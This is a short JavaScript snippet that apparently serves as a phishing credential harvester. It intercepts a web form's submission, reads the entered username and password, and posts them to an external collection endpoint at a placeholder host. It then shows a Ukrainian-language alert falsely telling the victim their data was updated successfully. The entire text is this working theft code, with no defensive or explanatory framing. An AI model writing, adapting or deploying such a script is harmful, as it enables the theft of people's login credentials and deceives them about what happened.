
document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://your-server.com/collect-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
    })
    .then(response => {
        if (response.ok) {
            alert('Дані успішно оновлено!');
        } else {
            alert('Сталася помилка. Спробуйте ще раз.');
        }
    })
    .catch(error => {
        console.error('Помилка:', error);
    });
});
